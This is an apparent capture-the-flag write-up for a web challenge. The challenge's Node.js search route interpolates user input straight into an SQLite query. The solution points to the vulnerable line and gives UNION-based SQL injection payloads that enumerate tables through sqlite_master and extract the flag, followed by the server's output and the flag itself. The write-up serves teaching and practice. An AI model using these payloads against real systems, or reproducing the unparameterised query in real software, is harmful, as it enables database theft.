<h1>Yummy Vegetables</h1>

<h2>Description</h2>

<blockquote>
  <p>I love me my vegetables, but I can never remember what color they are! I know lots of people have this problem, so I made a site to help.</p>
</blockquote>

<p>```javascript
const express = require('express');
const Ajv = require('ajv');
const sqlite = require('better-sqlite3');</p>

<p>const sleep = (ms) =&gt; new Promise((res) =&gt; { setTimeout(res, ms) })</p>

<p>// set up express
const app = express();
app.use(express.json());
app.use(express.static('public'));</p>

<p>// ajv request validator
const ajv = new Ajv();
const schema = {
  type: 'object',
  properties: {
    query: { type: 'string' },
  },
  required: ['query'],
  additionalProperties: false
};
const validate = ajv.compile(schema);</p>

<p>// database
const db = sqlite('db.sqlite3');</p>

<p>// search route
app.search('/search', async (req, res) =&gt; {
  if (!validate(req.body)) {
    return res.json({
      success: false,
      msg: 'Invalid search query',
      results: [],
    });
  }</p>

<p>await sleep(5000); // the database is slow :p</p>

<p>const query = <code>SELECT * FROM veggies WHERE name LIKE '%${req.body.query}%';</code>;
  let results;
  try {
    results = db.prepare(query).all();
  } catch {
    return res.json({
      success: false,
      msg: 'Something went wrong :(',
      results: [],
    })
  }</p>

<p>return res.json({
    success: true,
    msg: <code>${results.length} result(s)</code>,
    results,
  });
});</p>

<p>// start server
app.listen(3000, () =&gt; {
  console.log('Server started');
});
```</p>

<h2>Solution</h2>

<p>The vulnerable line in the code is the following:</p>

<p><code>javascript
const query = `SELECT * FROM veggies WHERE name LIKE '%${req.body.query}%';`;
</code></p>

<p>The application is passing unsanitized user input into the SQL query directly!</p>

<p>From the source code, we know we are dealing with an SQLite database. In order to retrieve the table names, we inject the following UNION query.</p>

<p><code>json
{
    "query":"%' and 0 UNION SELECT name, null, null FROM  sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%';--"
}
</code></p>

<p>This shows us an additional table that contains the flag!</p>

<p><code>json
{
    "success":true,
    "msg":"2 result(s)",
    "results":
    [
        {
            "id":"the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5",
            "name":null,
            "color":null
        },
        {
            "id":"veggies",
            "name":null,
            "color":null
        }
    ]
}
</code></p>

<p>From here, we can get the flag.</p>

<p><code>json
{
    "query":"%' and 0 UNION SELECT flag, null, null FROM the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5;--"
}
</code></p>

<p>The flag is <code>MetaCTF{sql1t3_m4st3r_0r_just_gu3ss_g0d??}</code>.</p>
